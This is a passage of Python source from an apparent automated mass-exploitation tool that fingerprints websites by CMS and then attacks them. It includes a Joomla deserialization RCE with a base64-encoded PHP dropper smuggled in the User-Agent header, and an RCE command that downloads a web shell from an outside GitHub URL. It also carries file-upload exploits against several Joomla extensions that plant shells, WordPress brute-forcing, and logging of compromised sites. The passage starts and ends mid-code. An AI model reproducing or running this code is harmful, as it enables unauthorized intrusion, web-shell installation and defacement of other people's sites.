                    for xxx in Hunt_urlss:
                        qqqq = xxx.replace('...','')
                        print('    ['  + '*' + '] ' + qqqq.split('/')[0])
                        with open('onhold_zone.txt', 'a') as rrr:
                            rrr.write("http://" + qqqq.split('/')[0] + '\n')
                            while qwd == 50:
                                qwd +=1
                                lists = 'onhold_zone.txt'
                                url = open(lists, 'r').readlines()
                                readsplit = open(lists).read().splitlines()
                                self.giti(readsplit,url)

        else:
            print("Grabb Sites Completed !!")  
            lists = "onhold_zone.txt"
            url = open(lists, 'r').readlines()
            readsplit = open(lists).read().splitlines()
            self.giti(readsplit,url)         

    def cms(self, url):
        url = url.replace('\n', '').replace('\r', '')
        Joomla = '{}/administrator/help/en-GB/toc.json'.format(url)    # "COMPONENTS_BANNERS_BANNERS"
        Joomla2 = '{}/administrator/language/en-GB/install.xml'.format(url)   # <author>Joomla!
        Joomla3 = '{}/plugins/system/debug/debug.xml'.format(url)  # <author>Joomla!
        Joomla4 = '{}/administrator/'.format(url)
        Wordpress = '{}'.format(url)  # /wp-content/ or /wp-inclues
        Wordpress2 = '{}/wp-includes/js/jquery/jquery.js'.format(url)  # (c) jQuery Foundation
        drupal = '{}/misc/ajax.js'.format(url)  # Drupal.ajax
        drupal2 = '{}'.format(url)  # /sites/default/files
        Opencart = '{}/admin/view/javascript/common.js'.format(url)  # getURLVar(key)
        osCommerce = '{}/admin/includes/general.js'.format(url)  # function SetFocus()
        vBulletin = '{}/images/editor/separator.gif'.format(url)
        vBulletin2 = '{}/js/header-rollup-554.js'.format(url)  # /js/header-rollup-554.js
        liferay = '{}/api/jsonws/invoke'.format(url)
        larapel = '{}/.env'.format(url)
        larapel2 = '{}/vendor/autoload.php'.format(url)
        larapel3 = '{}/vendor/'.format(url)
        larapel3 = '{}/vendor/'.format(url)
        tele1 = '{}/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx'.format(url)
        tele2 = '{}/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx'.format(url)
        tele3 = '{}/desktopmodules/telerikwebui/radeditorprovider/telerik.web.ui.dialoghandler.aspx'.format(url)
        try:
            Checkcmsr = requests.get(url, timeout=10, headers=Headers).text
            if 'CMS Made Simple' in str(Checkcmsr):
                try:
                    with open('cmsmadesimple.txt', 'a') as XW:
                        XW.write(url + '\n')
                    self.cnsmade(url)
                except:
                    pass 
                return 'Cmsmadesimple'
            Checkliferay = requests.get(liferay, timeout=10, headers=Headers).text
            if 'Unable to deserialize object' in str(Checkliferay):
                try:
                    with open('liferay.txt', 'a') as XW:
                        XW.write(url + '\n')
                    self.liferayx(url)
                except:
                    pass 
                return 'Liferay'
            Checktele = requests.get(tele1, timeout=10, headers=Headers).text
            if 'Loading the dialog' in str(Checktele):
                try:
                    with open('telerik.txt', 'a') as XW:
                        XW.write(url + '\n')
                    likk=tele1
                    self.teleex(likk)
                except:
                    pass 
                return 'Telerik'
            Checktele = requests.get(tele2, timeout=10, headers=Headers).text
            if 'Loading the dialog' in str(Checktele):
                try:
                    with open('telerik.txt', 'a') as XW:
                        XW.write(url + '\n')
                    likk=tele2
                    self.teleex(likk)
                except:
                    pass 
                return 'Telerik'
            Checktele = requests.get(tele3, timeout=10, headers=Headers).text
            if 'Loading the dialog' in str(Checktele):
                try:
                    with open('telerik.txt', 'a') as XW:
                        XW.write(url + '\n')
                    likk=tele3
                    self.teleex(likk)
                except:
                    pass 
                return 'Telerik'
            CheckLaravel3 = requests.get(larapel3, timeout=10, headers=Headers)
            if 'phpunit/' in CheckLaravel3 or 'Index of /vendor' in CheckLaravel3:
                try:
                    with open('Laravel.txt', 'a') as XW:
                        XW.write(url + '\n')
                    self.othercms(url)
                except:
                    pass
                return 'LaravSkuy'    
            CheckLaravel = requests.get(larapel, timeout=10, headers=Headers).text
            if 'DB_HOST' in str(CheckLaravel) or 'DB_PASSWORD' in str(CheckLaravel):
                try:
                    with open('Laravel.txt', 'a') as XW:
                        XW.write(url + '\n')
                    self.othercms(url)
                except:
                    pass 
                return 'LaravSkuy'

            CheckWp = requests.get(Wordpress, timeout=10, headers=Headers).text
            if '/wp-content/' in str(CheckWp) or '/wp-inclues/' in str(CheckWp):
                try:
                
                    self.wpbrute(url)
                    with open('Wordpress.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'wordpress'
            CheckWp2 = requests.get(Wordpress2, timeout=10, headers=Headers).text
            if '(c) jQuery Foundation' in str(CheckWp2):
                try:
                
                    self.wpbrute(url)
                    with open('Wordpress.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'wordpress'
            CheckJom = requests.get(Joomla, timeout=10, headers=Headers).text
            if '"COMPONENTS_BANNERS_BANNERS"' in str(CheckJom):
                try:

                    self.joomla(url)
                    self.RCE_Joomla(url)
                    with open('joomla.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'joomla'
            CheckJom2 = requests.get(Joomla2, timeout=10, headers=Headers).text
            if '<author>Joomla!' in str(CheckJom2):
                try:
                
                    self.joomla(url)
                    self.RCE_Joomla(url)
                    with open('joomla.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'joomla'
            CheckJom3 = requests.get(Joomla3, timeout=10, headers=Headers).text
            if '<author>Joomla!' in str(CheckJom3):
                try:
                
                    self.joomla(url)
                    self.RCE_Joomla(url)
                    with open('joomla.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'joomla'
            CheckJom4 = requests.get(Joomla4, timeout=10, headers=Headers).text
            if 'content="Joomla!' in str(CheckJom4):
                try:

                    self.joomla(url)
                    self.RCE_Joomla(url)
                    with open('joomla.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'joomla'
            CheckDrupal = requests.get(drupal, timeout=10, headers=Headers).text
            if 'Drupal.ajax' in str(CheckDrupal):
                try:

                    self.timezone(url)
                    self.mail(url)
                    self.drupal7_1(url)
                    self.Drupal(url)
                    with open('drupal.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'drupal'
            CheckDrupal2 = requests.get(drupal2, timeout=10, headers=Headers).text
            if '/sites/default/files' in str(CheckDrupal2):
                try:

                    self.timezone(url)
                    self.mail(url)
                    self.drupal7_1(url)
                    self.Drupal(url)
                    with open('drupal.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'drupal'
            CheckOpencart = requests.get(Opencart, timeout=10, headers=Headers).text
            if 'getURLVar(key)' in str(CheckOpencart):
                try:

                    self.opencart(url)
                    with open('opencart.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'opencart'
            CheckOsCommerce = requests.get(osCommerce, timeout=10, headers=Headers).text
            if 'function SetFocus()' in str(CheckOsCommerce):
                try:
                    with open('oscommerce.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'oscommerce'
            Checkvb = requests.get(vBulletin, timeout=10, headers=Headers).text
            if 'GIF89a' in str(Checkvb):
                try:
                    vbsite(url)
                    with open('vBulletin.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'vBulletin'
            Checkvb2 = requests.get(vBulletin2, timeout=10, headers=Headers).text
            if 'js.compressed/modernizr.min.js' in str(Checkvb2):
                try:

                    vbsite(url)
                    with open('vBulletin.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'vBulletin'
            if 'content="vBulletin' in str(CheckDrupal2):
                try:
                    vbsite(url)
                    with open('vBulletin.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'vBulletin'
            if 'var prestashop =' in str(CheckDrupal2):
                try:
                    with open('prestashop.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'prestashop'
            else:
                try:
                    self.othercms(url)
                    with open('unknown.txt', 'a') as XW:
                        XW.write(url + '\n')
                except:
                    pass
                return 'unknown'

        except Exception as e:
            #print('[ + ] {} | unkown' .format(url))
            pass



    def RCE_Joomla(self, url):
        try:
            pl = self.generate_payload(
                "base64_decode('JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvdG1wL3Z1bG4yLnBocCIgOw0KJGZwPWZvcGVuKCIkY2hlY2siLCJ3KyIpOw0KZndyaXRlKCRmcCxiYXNlNjRfZGVjb2RlKCdQRDl3YUhBTkNtWjFibU4wYVc5dUlHaDBkSEJmWjJWMEtDUjFjbXdwZXcwS0NTUnBiU0E5SUdOMWNteGZhVzVwZENna2RYSnNLVHNOQ2dsamRYSnNYM05sZEc5d2RDZ2thVzBzSUVOVlVreFBVRlJmVWtWVVZWSk9WRkpCVGxOR1JWSXNJREVwT3cwS0NXTjFjbXhmYzJWMGIzQjBLQ1JwYlN3Z1ExVlNURTlRVkY5RFQwNU9SVU5VVkVsTlJVOVZWQ3dnTVRBcE93MEtDV04xY214ZmMyVjBiM0IwS0NScGJTd2dRMVZTVEU5UVZGOUdUMHhNVDFkTVQwTkJWRWxQVGl3Z01TazdEUW9KWTNWeWJGOXpaWFJ2Y0hRb0pHbHRMQ0JEVlZKTVQxQlVYMGhGUVVSRlVpd2dNQ2s3RFFvSmNtVjBkWEp1SUdOMWNteGZaWGhsWXlna2FXMHBPdzBLQ1dOMWNteGZZMnh2YzJVb0pHbHRLVHNOQ24wTkNpUmphR1ZqYXlBOUlDUmZVMFZTVmtWU1d5ZEVUME5WVFVWT1ZGOVNUMDlVSjEwZ0xpQWlMM1J0Y0M5MmRXeHVMbkJvY0NJZ093MEtKSFJsZUhRZ1BTQm9kSFJ3WDJkbGRDZ25hSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEx6QTBlQzlKUTBjdFFYVjBiMFY0Y0d4dmFYUmxja0p2VkM5dFlYTjBaWEl2Wm1sc1pYTXZkWEF1Y0dod0p5azdEUW9rYjNCbGJpQTlJR1p2Y0dWdUtDUmphR1ZqYXl3Z0ozY25LVHNOQ21aM2NtbDBaU2drYjNCbGJpd2dKSFJsZUhRcE93MEtabU5zYjNObEtDUnZjR1Z1S1RzTkNtbG1LR1pwYkdWZlpYaHBjM1J6S0NSamFHVmpheWtwZXcwS0lDQWdJR1ZqYUc4Z0pHTm9aV05yTGlJOEwySnlQaUk3RFFwOVpXeHpaU0FOQ2lBZ1pXTm9ieUFpYm05MElHVjRhWFJ6SWpzTkNtVmphRzhnSW1SdmJtVWdMbHh1SUNJZ093MEtKR05vWldOck1pQTlJQ1JmVTBWU1ZrVlNXeWRFVDBOVlRVVk9WRjlTVDA5VUoxMGdMaUFpTDJsdFlXZGxjeTkyZFd4dUxuQm9jQ0lnT3cwS0pIUmxlSFF5SUQwZ2FIUjBjRjluWlhRb0oyaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM4d05IZ3ZTVU5ITFVGMWRHOUZlSEJzYjJsMFpYSkNiMVF2YldGemRHVnlMMlpwYkdWekwzVndMbkJvY0NjcE93MEtKRzl3Wlc0eUlEMGdabTl3Wlc0b0pHTm9aV05yTWl3Z0ozY25LVHNOQ21aM2NtbDBaU2drYjNCbGJqSXNJQ1IwWlhoME1pazdEUXBtWTJ4dmMyVW9KRzl3Wlc0eUtUc05DbWxtS0dacGJHVmZaWGhwYzNSektDUmphR1ZqYXpJcEtYc05DaUFnSUNCbFkyaHZJQ1JqYUdWamF6SXVJand2WW5JK0lqc05DbjFsYkhObElBMEtJQ0JsWTJodklDSnViM1FnWlhocGRITXlJanNOQ21WamFHOGdJbVJ2Ym1VeUlDNWNiaUFpSURzTkNnMEtKR05vWldOck16MGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTkyZFd4dUxtaDBiU0lnT3cwS0pIUmxlSFF6SUQwZ2FIUjBjRjluWlhRb0oyaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRMM0poZHk4NE9EQjFabUZYUmljcE93MEtKRzl3TXoxbWIzQmxiaWdrWTJobFkyc3pMQ0FuZHljcE93MEtabmR5YVhSbEtDUnZjRE1zSkhSbGVIUXpLVHNOQ21aamJHOXpaU2drYjNBektUc05DZzBLRFFva1kyaGxZMnMyUFNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwybHRZV2RsY3k5MmRXeHVMbWgwYlNJZ093MEtKSFJsZUhRMklEMGdhSFIwY0Y5blpYUW9KMmgwZEhCek9pOHZjR0Z6ZEdWaWFXNHVZMjl0TDNKaGR5ODRPREIxWm1GWFJpY3BPdzBLSkc5d05qMW1iM0JsYmlna1kyaGxZMnMyTENBbmR5Y3BPdzBLWm5keWFYUmxLQ1J2Y0RZc0pIUmxlSFEyS1RzTkNtWmpiRzl6WlNna2IzQTJLVHNOQ2o4KycpKTsNCmZjbG9zZSgkZnApOw0KJGNoZWNrMiA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiAiL2ltYWdlcy92dWxuMi5waHAiIDsNCiRmcDI9Zm9wZW4oIiRjaGVjazIiLCJ3KyIpOw0KZndyaXRlKCRmcDIsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQU5DbVoxYm1OMGFXOXVJR2gwZEhCZloyVjBLQ1IxY213cGV3MEtDU1JwYlNBOUlHTjFjbXhmYVc1cGRDZ2tkWEpzS1RzTkNnbGpkWEpzWDNObGRHOXdkQ2drYVcwc0lFTlZVa3hQVUZSZlVrVlVWVkpPVkZKQlRsTkdSVklzSURFcE93MEtDV04xY214ZmMyVjBiM0IwS0NScGJTd2dRMVZTVEU5UVZGOURUMDVPUlVOVVZFbE5SVTlWVkN3Z01UQXBPdzBLQ1dOMWNteGZjMlYwYjNCMEtDUnBiU3dnUTFWU1RFOVFWRjlHVDB4TVQxZE1UME5CVkVsUFRpd2dNU2s3RFFvSlkzVnliRjl6WlhSdmNIUW9KR2x0TENCRFZWSk1UMUJVWDBoRlFVUkZVaXdnTUNrN0RRb0pjbVYwZFhKdUlHTjFjbXhmWlhobFl5Z2thVzBwT3cwS0NXTjFjbXhmWTJ4dmMyVW9KR2x0S1RzTkNuME5DaVJqYUdWamF5QTlJQ1JmVTBWU1ZrVlNXeWRFVDBOVlRVVk9WRjlTVDA5VUoxMGdMaUFpTDNSdGNDOTJkV3h1TG5Cb2NDSWdPdzBLSkhSbGVIUWdQU0JvZEhSd1gyZGxkQ2duYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMekEwZUM5SlEwY3RRWFYwYjBWNGNHeHZhWFJsY2tKdlZDOXRZWE4wWlhJdlptbHNaWE12ZFhBdWNHaHdKeWs3RFFva2IzQmxiaUE5SUdadmNHVnVLQ1JqYUdWamF5d2dKM2NuS1RzTkNtWjNjbWwwWlNna2IzQmxiaXdnSkhSbGVIUXBPdzBLWm1Oc2IzTmxLQ1J2Y0dWdUtUc05DbWxtS0dacGJHVmZaWGhwYzNSektDUmphR1ZqYXlrcGV3MEtJQ0FnSUdWamFHOGdKR05vWldOckxpSThMMkp5UGlJN0RRcDlaV3h6WlNBTkNpQWdaV05vYnlBaWJtOTBJR1Y0YVhSeklqc05DbVZqYUc4Z0ltUnZibVVnTGx4dUlDSWdPdzBLSkdOb1pXTnJNaUE5SUNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwybHRZV2RsY3k5MmRXeHVMbkJvY0NJZ093MEtKSFJsZUhReUlEMGdhSFIwY0Y5blpYUW9KMmgwZEhCek9pOHZjbUYzTG1kcGRHaDFZblZ6WlhKamIyNTBaVzUwTG1OdmJTOHdOSGd2U1VOSExVRjFkRzlGZUhCc2IybDBaWEpDYjFRdmJXRnpkR1Z5TDJacGJHVnpMM1Z3TG5Cb2NDY3BPdzBLSkc5d1pXNHlJRDBnWm05d1pXNG9KR05vWldOck1pd2dKM2NuS1RzTkNtWjNjbWwwWlNna2IzQmxiaklzSUNSMFpYaDBNaWs3RFFwbVkyeHZjMlVvSkc5d1pXNHlLVHNOQ21sbUtHWnBiR1ZmWlhocGMzUnpLQ1JqYUdWamF6SXBLWHNOQ2lBZ0lDQmxZMmh2SUNSamFHVmphekl1SWp3dlluSStJanNOQ24xbGJITmxJQTBLSUNCbFkyaHZJQ0p1YjNRZ1pYaHBkSE15SWpzTkNtVmphRzhnSW1SdmJtVXlJQzVjYmlBaUlEc05DZzBLSkdOb1pXTnJNejBrWDFORlVsWkZVbHNuUkU5RFZVMUZUbFJmVWs5UFZDZGRJQzRnSWk5MmRXeHVMbWgwYlNJZ093MEtKSFJsZUhReklEMGdhSFIwY0Y5blpYUW9KMmgwZEhCek9pOHZjR0Z6ZEdWaWFXNHVZMjl0TDNKaGR5ODRPREIxWm1GWFJpY3BPdzBLSkc5d016MW1iM0JsYmlna1kyaGxZMnN6TENBbmR5Y3BPdzBLWm5keWFYUmxLQ1J2Y0RNc0pIUmxlSFF6S1RzTkNtWmpiRzl6WlNna2IzQXpLVHNOQ2cwS0RRb2tZMmhsWTJzMlBTUmZVMFZTVmtWU1d5ZEVUME5WVFVWT1ZGOVNUMDlVSjEwZ0xpQWlMMmx0WVdkbGN5OTJkV3h1TG1oMGJTSWdPdzBLSkhSbGVIUTJJRDBnYUhSMGNGOW5aWFFvSjJoMGRIQnpPaTh2Y0dGemRHVmlhVzR1WTI5dEwzSmhkeTg0T0RCMVptRlhSaWNwT3cwS0pHOXdOajFtYjNCbGJpZ2tZMmhsWTJzMkxDQW5keWNwT3cwS1puZHlhWFJsS0NSdmNEWXNKSFJsZUhRMktUc05DbVpqYkc5elpTZ2tiM0EyS1RzTkNqOCsnKSk7DQpmY2xvc2UoJGZwMik7DQo=')")
            headers = {
                'User-Agent': pl
            }
            try:
                cookies = requests.get(url, headers=Headers, timeout=5).cookies
            except:
                pass
            try:
                rr = requests.get(url + '/', headers=Headers, cookies=cookies, timeout=5)
                if rr:
                    requests.get(url + '/images/vuln2.php', timeout=5)
                    requests.get(url + '/tmp/vuln2.php', timeout=5)
                    ShellCheck = requests.get(url + '/images/vuln.php', timeout=5)
                    ShellCheck2 = requests.get(url + '/tmp/vuln.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text:
                        print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [RCE Old Shell]'+ '\n')
                        with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                            writer.write(url + '/images/vuln.php' + '\n')
                        IndexCheck = requests.get(url + '/Hacked.htm', timeout=5)
                        IndexCheck2 = requests.get(url + '/images/vuln.htm', timeout=5)
                        if 'Vuln!!' in IndexCheck.text:
                            print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [RCE Old İndex]'+ '\n')
                            with open('Vulns/Index_Vulnss.txt', 'a') as writer:
                                writer.write(url + '/vuln.htm' + '\n')
                        elif 'Vuln!!' in IndexCheck2.text:
                            print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [RCE Old İndex]'+ '\n')
                            with open('Vulns/Index_Vulnss.txt', 'a') as writer:
                                writer.write(url + '/images/vuln.htm' + '\n')
                    elif 'Vuln!!' in ShellCheck2.text:
                        print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [RCE Old Shell]'+ '\n')
                        with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                            writer.write(url + '/tmp/vuln.php' + '\n')
                        IndexCheck = requests.get(url + '/vuln.htm', timeout=5)
                        IndexCheck2 = requests.get(url + '/images/vuln.htm', timeout=5)
                        if 'Vuln!!' in IndexCheck.text:
                            print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [RCE Old İndex]'+ '\n')
                            with open('Vulns/Index_Vulnss.txt', 'a') as writer:
                                writer.write(url + '/vuln.htm' + '\n')
                        elif 'Vuln!!' in IndexCheck2.text:
                            print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [RCE Old İndex]'+ '\n')
                            with open('Vulns/Index_Vulnss.txt', 'a') as writer:
                                writer.write(url + '/images/vuln.htm' + '\n')
                    else:
                        print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln RCE Old]'+la7mar+ '\n')
                else:
                    print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln RCE Old]'+la7mar+ '\n')
            except:
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln RCE Old]'+la7mar+ '\n')
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln RCE Old]'+la7mar+ '\n')

    def php_str_noquotes(self, data):
        try:
            encoded = ""
            for char in data:
                encoded += "chr({0}).".format(ord(char))
            return encoded[:-1]
        except:
            pass

    def generate_payload(self, php_payload):
        try:
            php_payload = "eval({0})".format(php_payload)
            terminate = '\xf0\xfd\xfd\xfd';
            exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
            injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
            exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
            exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
            return exploit_template
        except:
            pass
            
    def joomla(self,url):
    
        try:
            command = "echo 'New RCE' > vuln.htm;wget https://raw.githubusercontent.com/izx2023/z/main/14.php;curl https://raw.githubusercontent.com/izx2023/z/main/14.php -o 155.php"
            function = "system"

            template = 's:1:"a";O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
            payload =  'http://google.de; ' + command
            final_payload = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))

            ix = url + '/index.php/component/users'

            s = requests.session()
            print('[+] Getting CSRF Token')
            resp = s.get(ix)
            html = BeautifulSoup(resp.text,'html.parser')
            csrf = html.find_all('input')[-1].get("name")
            user_payload = '\\0\\0\\0' * 9
            inj_object = 'AAA";'
            inj_object += final_payload
            inj_object += 's:6:"return";s:102:'
            password_payload = inj_object
            self.params = {
                    'username': user_payload,
                    'password': password_payload,
                    'option':'com_users',
                    'task':'user.login',
                    csrf :'1'
                    }
            resp  = s.post(ix, data=self.params)
            CheckShell = requests.get(url + '/14.php', headers=agent, timeout=10)
            #requests.get(url + '/cc.php', headers=Headers, timeout=10)
            if 'SEA-GHOST' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/14.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [RCE New Shell]'+ '\n')
            elif 'SEA-GHOST' in requests.get(url + '/155.php', headers=agent, timeout=10).text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/155.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [RCE New Shell]'+ '\n')
            elif 'New RCE' in requests.get(url + '/vuln.htm', headers=agent, timeout=10).text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/vuln.htm' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [RCE New Shell]'+ '\n')                
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln RCE New]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln RCE New]'+la7mar+ '\n')
            pass     

        try:
            Checker = requests.get(url + "/components/com_foxcontact/foxcontact.php", timeout=10, headers=Headers)
            if 'Restricted access' in str(Checker.text):
                GotCid = requests.get(url + '/index.php?option=com_foxcontact&amp;view=invalid',timeout=10, headers=Headers)
                cids = re.findall('foxcontact&amp;Itemid=(.*?)" >', str(GotCid.text))
                for cid in cids:
                    cid = str(cid)
                    URLS = ['/components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../{}'.format(cid, cid, 'vuln.php'),'/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../{}'.format(cid, cid, cid, 'vuln.php'),'/index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../{}'.format(cid, cid, cid, cid, 'vuln.php'),'/components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../{}'.format(cid, cid, 'vuln.php')]
                    for path in URLS:
                        Exp = url + path
                        requests.post(Exp, data=shell, timeout=10, headers=Headers)
                        SH = requests.get(url + '/components/com_foxcontact/vuln.php', timeout=10, headers=Headers)
                        if 'RxR HaCkEr' in str(SH.text):
                            print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [Com_FoxContact Shell]'+ '\n')
                            with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                                writer.write(url + '/components/com_foxcontact/vuln.php' + '\n')
                        else:
                            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln Com_FoxContact]'+la7mar+ '\n')
                            pass
            else:
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln Com_FoxContact]'+la7mar+ '\n')
                pass
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln Com_FoxContact]'+la7mar+ '\n')
            pass

        try:
            izo = ran(10) + '.php' 
            PostFile = {'file':(izo, shell,'text/html')}
            requests.post(url + '/index.php?option=com_djclassifieds&task=upload&tmpl=component', files=PostFile, timeout=10, headers=Headers)
            CheckShell = requests.get(url + '/tmp/djupload/'+izo, timeout=10, headers=Headers)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/tmp/djupload/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_djclassifieds Shell]'+ '\n')
            else: 
                 print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_djclassifieds]'+la7mar+ '\n')               
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_djclassifieds]'+la7mar+ '\n')
            pass
        try:
            izo = self.ran(10) + '.php'            
            shelle_content = requests.get("https://raw.githubusercontent.com/izx2023/z/main/14.php")
            requests.post(url + '/index.php?option=com_djclassifieds&task=upload&tmpl=component', files={"file":(izo,shelle_content.text.encode(), "text/html")}, timeout=10, headers=Headers)
            CheckShell = requests.get(url + '/tmp/djupload/'+izo, timeout=10, headers=Headers)
            if 'SEA-GHOST' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/tmp/djupload/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_djclassifieds-2 Shell]'+ '\n')
            else: 
                 print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_djclassifieds-2]'+la7mar+ '\n')               
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_djclassifieds-2]'+la7mar+ '\n')
            pass 

        try:
            sess = requests.Session()
            aaReflexup = {'def_content':_shell,'option':'com_cloner','language':'english','task':'save_lang','boxchecked':0,'hidemainmenu':0}
            Exp = url + "/administrator/components/com_xcloner-backupandrestore/index2.php"
            sess.post(Exp, files=aaReflexup, timeout=10, headers=Headers)
            Check = requests.get(url  + '/administrator/components/com_xcloner-backupandrestore/language/english.php?X=izo', headers=Headers,timeout=10)
            if 'izocin' in str(Check.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + '/administrator/components/com_xcloner-backupandrestore/language/english.php?X=izo' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_xcloner Shell]'+ '\n')
            else:
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_xcloner]'+la7mar+ '\n')
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_xcloner]'+la7mar+ '\n')
            pass
    
        try:
            izo = self.ran(10) + '.php'
            PostFile = {'file':(izo, shell,'text/html')}
            requests.post(url + '/modules/mod_simplefileuploadv1.3/elements/udd.php', files=PostFile, timeout=10, headers=agent)
            CheckShell = requests.get(url + '/modules/mod_simplefileuploadv1.3/elements/up.php', timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/modules/mod_simplefileuploadv1.3/elements/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [mod_simplefileuploadv1.3 Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln mod_simplefileuploadv1.3]'+la7mar+ '\n')                 
        except:
